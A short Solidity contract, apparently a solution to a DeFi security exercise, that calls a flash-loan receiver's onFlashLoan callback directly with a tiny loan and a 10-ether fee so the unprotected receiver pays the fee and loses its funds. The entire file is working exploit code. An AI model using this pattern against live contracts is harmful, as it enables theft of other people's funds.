// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
interface IFlashloanReciever {
    function onFlashLoan( 
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external;
}
contract HackFlashLoanReceiver {

    IFlashloanReciever receiver;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _pool) {
        receiver = IFlashloanReciever(_pool);
    }

    function hack() public {
        receiver.onFlashLoan(
            msg.sender,
            ETH,
            1,
            10*10**18,
            "scam");
        }
    receive() external payable {}
}
